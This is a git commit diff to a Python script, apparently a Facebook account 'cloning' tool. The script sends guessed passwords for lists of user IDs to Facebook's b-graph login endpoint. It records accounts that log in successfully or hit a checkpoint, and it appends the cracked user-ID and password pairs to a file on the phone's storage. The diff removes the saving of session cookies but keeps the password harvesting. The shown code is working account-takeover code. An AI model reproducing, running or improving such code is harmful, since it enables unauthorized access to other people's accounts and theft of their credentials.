87602b3ffa1cec2e630af1cb4f4e30888e1e7164
HOOM <164628890+Hoom826@users.noreply.github.com>
2025-08-28 16:26:01 +0500

    Update MAnas.py

--- MAnas.py
+++ MAnas.py
@@ -331,17 +331,16 @@ def login1(uid):
             url = "https://b-graph.facebook.com/auth/login"
             rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if "session_key" in rp:
-                cookies = ";".join([f"{i['name']}={i['value']}" for i in rp.get('session_cookies', [])])
                 oks.append(uid)
-                open("/sdcard/ANAS_CLONING-OK.txt", "a").write(uid + "|" + pw + "|" + cookies + "\n")
-                print(f'\r\033[38;5;46m[ANAS-OK] {uid} ● {pw} ● COOKIE={cookies}\033[1;97m')
+                open("/sdcard/ANAS_CLONING.txt", "a").write(uid + "|" + pw + "\n")
+                print(f'\r\033[38;5;46m[ANAS-OK] {uid} ● {pw}\033[1;97m')
                 break
 
+            # ✅ CP case
             elif "www.facebook.com" in rp.get('error', {}).get('message', ''):
-                cookies = ";".join([f"{i.get('name')}={i.get('value')}" for i in rp.get('session_cookies', [])]) if "session_cookies" in rp else "NO-COOKIE"
                 cps.append(uid)
-                open("/sdcard/ANAS_CLONING-OK.txt", "a").write(uid + "|" + pw + "|" + cookies + "\n")
-                print(f'\r\033[38;5;226m[ANAS-CP] {uid} ● {pw} ● COOKIE={cookies}\033[1;97m')
+                open("/sdcard/ANAS_CLONING.txt", "a").write(uid + "|" + pw + "\n")
+                print(f'\r\033[38;5;226m[ANAS-CP] {uid} ● {pw}\033[1;97m')
                 break
 
             else:
